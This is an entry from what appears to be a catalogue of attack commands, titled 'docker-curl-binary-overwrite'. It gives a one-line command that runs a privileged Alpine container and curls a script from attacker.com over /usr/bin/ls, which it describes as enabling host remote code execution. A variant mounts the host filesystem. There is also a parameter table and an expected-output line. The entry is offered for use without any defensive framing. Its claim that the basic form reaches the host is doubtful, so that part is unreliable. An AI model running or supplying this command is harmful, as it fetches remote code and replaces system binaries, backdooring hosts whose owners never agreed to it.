---
data: >-
  docker run --privileged alpine sh -c 'curl http://attacker.com/x.sh -o
  /usr/bin/ls'
tags:
  - docker
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:12.426Z'
id: 46e95a00-dc1b-4b63-9a3d-7ac48a5b410e
verified: false
validated: true
submitted: true
---
# docker-curl-binary-overwrite

## Command

```bash
docker run --privileged alpine sh -c 'curl http://attacker.com/x.sh -o /usr/bin/ls'
```

## Description

Runs a privileged Alpine container to overwrite /usr/bin/ls with a malicious script using cURL, enabling host RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `run` | Start container | Yes |
| `--privileged` | Full host access | Yes |
| `alpine` | Image | Yes |
| `sh -c` | Execute shell command | Yes |
| `'curl ...'` | Inner cURL command | Yes |

## Examples

### Basic Usage

```bash
docker run --privileged alpine sh -c 'curl http://attacker.com/x.sh -o /usr/bin/ls'
```

### Advanced Usage

```bash
docker run --privileged -v /:/host alpine sh -c 'curl ... -o /host/bin/ls'
```

## Expected Output

Container runs silently; binary overwritten.

## Related

- [[commands/sudo-curl-cron-backdoor]]
